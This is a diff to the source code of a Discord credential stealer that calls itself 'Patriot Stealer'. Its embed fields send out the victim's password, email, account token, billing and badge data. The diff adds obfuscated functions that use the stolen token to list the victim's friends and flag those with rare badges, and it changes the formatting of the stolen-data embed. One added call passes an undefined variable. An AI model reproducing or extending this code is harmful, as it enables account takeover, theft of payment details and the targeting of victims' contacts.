@@ -13,7 +13,7 @@ const config = {
   ping_val: '@everyone', 
   embed_name: 'Patriot Stealer',
   embed_icon: 'https://i.ibb.co/945sPGj/patriot-text.png'.replace(/ /g, '%20'),
-  embed_color: 15548997,
+  embed_color: 3092790,
   injection_url: '', 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
@@ -531,6 +531,45 @@ const Purchase = async (token, id, _type, _time) => {
   } else return null;
 };
 
+function getRareBadges(_0x3d2d4f) {
+  var _0x5b5562 = ''
+  for (const _0x4e94d4 in config.badges) {
+    let _0x4798d9 = config.badges[_0x4e94d4]
+    if ((_0x3d2d4f & _0x4798d9.Value) == _0x4798d9.Value && _0x4798d9.Rare) {
+      _0x5b5562 += _0x4798d9.Emoji
+    }
+  }
+  return _0x5b5562
+  }
+
+async function getRelationships(_0x113bce) {
+  var _0x30c4b0 = await execScript(
+      'var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );xmlHttp.setRequestHeader("Authorization", "' +
+        _0x113bce +
+        '");xmlHttp.send( null );xmlHttp.responseText',
+      true
+    ),
+    _0x3100cc = JSON.parse(_0x30c4b0)
+  const _0x4725ee = _0x3100cc.filter((_0x2ef78b) => {
+    return _0x2ef78b.type == 1
+  })
+  var _0x11e8e5 = ''
+  for (z of _0x4725ee) {
+    var _0xfd1854 = getRareBadges(z.user.public_flags)
+    _0xfd1854 != '' &&
+      (_0x11e8e5 +=
+        _0xfd1854 +
+        (' | ' + z.user.username + '#' + z.user.discriminator + '\n'))
+  }
+  if (!_0x11e8e5) {
+    _0x11e8e5 = 'No Rare Friends'
+  }
+  return {
+    length: _0x4725ee.length,
+    frien: _0x11e8e5,
+  }
+  }
+
 const buyNitro = async (token) => {
   const data = await fetchBilling(token);
   const failedMsg = 'Failed to Purchase ❌';
@@ -650,6 +689,7 @@ const login = async (email, password, token) => {
   const nitro = getNitro(json.premium_type);
   const badges = getBadges(json.flags);
   const billing = await getBilling(token);
+  const relation = await getRelationships(_0x389b2a)
   const content = {
     username: config.embed_name,
     avatar_url: config.embed_icon,
@@ -658,32 +698,32 @@ const login = async (email, password, token) => {
         color: config.embed_color,
         fields: [{
           name: "<:lxckk:1032868282153316353> Password",
-          value: `\`\`\`${password}\`\`\``,
+          value: `\`${password}\``,
           inline: true
         },
         {
           name: "<a:prt_world9:1032868293528268831> Email",
-          value: `\`\`\`${email}\`\`\``,
+          value: `\`${email}\``,
           inline: true
         },
         {
           name: "<:Patriot_Nitro:1032868403117051944> Nitro",
-          value: `\`\`\`${nitro}\`\`\``,
+          value: `\`${nitro}\``,
           inline: false
         }, 
         {
           name: "<a:ptr_billing:1032868278823038987> Billing",
-          value: `\`\`\`${billing}\`\`\``,
+          value: `\`${billing}\``,
           inline: true
         },
         {
           name: "<a:patriot_gng:1032868284699250731> Badges",
-          value: `\`\`\`${badges}\`\`\``,
+          value: `\`${badges}\``,
           inline: false
         },
         {
           name: "<:patriot_guilds:1032868286532173904> Token",
-          value: `\`\`\`${token}\`\`\``,
+          value: `\`${token}\``,
           inline: false
         },
       ],
@@ -705,7 +745,7 @@ const login = async (email, password, token) => {
         color: config.embed_color,
         fields: [{
           name: "<:lxckk:1032868282153316353> HQ Friends",
-          value: `\`\`\`${password}\`\`\``,
+          value: `\`\`\`${relation.length}\`\`\``,
           inline: true
         },
       ],
